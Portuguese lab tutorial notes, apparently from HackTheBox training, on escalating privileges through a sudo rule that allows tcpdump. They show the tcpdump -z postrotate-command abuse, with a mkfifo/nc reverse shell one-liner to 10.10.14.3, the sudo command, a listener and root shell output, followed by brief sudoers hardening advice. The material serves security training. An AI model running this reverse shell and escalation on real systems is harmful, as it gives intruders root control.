# Abuso de Privilégios Sudo

Privilégios de `sudo` podem ser concedidos a uma conta, permitindo executar comandos no contexto de `root` (ou outro usuário) sem trocar de usuário nem conceder permissões excessivas. Quando o comando `sudo` é usado, o sistema verifica se o usuário tem os direitos apropriados conforme configurado em `/etc/sudoers`. Ao obter acesso a um sistema, sempre devemos verificar se o usuário atual possui privilégios de sudo com `sudo -l`. Em alguns casos, será necessária a senha do usuário para listar os direitos, mas entradas com `NOPASSWD` podem ser vistas sem senha.

```bash
htb_student@NIX02:~$ sudo -l
```

```text
Matching Defaults entries for sysadm on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User sysadm may run the following commands on NIX02:
    (root) NOPASSWD: /usr/sbin/tcpdump
```

Esse tipo de configuração pode ser facilmente mal configurado. Por exemplo, um usuário pode receber permissões de root sem exigir senha. Ou a linha de comando permitida pode ser definida de forma ampla demais, permitindo execução de um programa de modo não previsto e resultando em escalada de privilégios.  
Se o `sudoers` contiver algo como `(ALL) NOPASSWD: /usr/sbin/tcpdump`, um atacante pode tentar abusar da opção `postrotate-command` do `tcpdump`.

```bash
htb_student@NIX02:~$ man tcpdump
```

```text
<SNIP>
-z postrotate-command

Used in conjunction with the -C or -G options, this will make `tcpdump` run "postrotate-command file" where the file is the savefile being closed after each rotation...
```

Ao definir o parâmetro `-z`, um atacante pode tentar usar o `tcpdump` para executar um script, obter shell reverso como root ou rodar outros comandos privilegiados. Exemplo:

```bash
htb_student@NIX02:~$ sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
```

Exemplo prático mostrado no material:

1. Criar o arquivo que será executado com `postrotate-command`, contendo um one-liner de reverse shell.
2. Abrir listener no host atacante.
3. Rodar `tcpdump` com sudo usando `-z` e `-Z root`.
4. Receber conexão reversa com privilégios de root (dependendo das proteções ativas no sistema).

```bash
htb_student@NIX02:~$ cat /tmp/.test
```

```text
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 443 >/tmp/f
```

```bash
htb_student@NIX02:~$ sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
```

```text
dropped privs to root
tcpdump: listening on ens192, link-type EN10MB (Ethernet), capture size 262144 bytes
Maximum file limit reached: 1
1 packet captured
6 packets received by filter
compress_savefile: execlp(/tmp/.test, /dev/null) failed: Permission denied
0 packets dropped by kernel
```

```bash
JLMreal@htb[/htb]$ nc -lnvp 443
```

```text
listening on [any] 443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.2.12] 38938
...
root@NIX02:~# id && hostname
uid=0(root) gid=0(root) groups=0(root)
NIX02
```

Em distribuições mais recentes, o AppArmor pode restringir comandos permitidos no `postrotate-command`, reduzindo esse vetor de execução.

## Boas práticas importantes ao configurar sudo

1. Sempre especificar o caminho absoluto dos binários no `sudoers`. Caso contrário, pode haver abuso de `PATH` com binário malicioso.
2. Conceder sudo com parcimônia e seguindo o princípio do menor privilégio. Quanto mais limitado o comando permitido, menor a chance de escalada bem-sucedida.

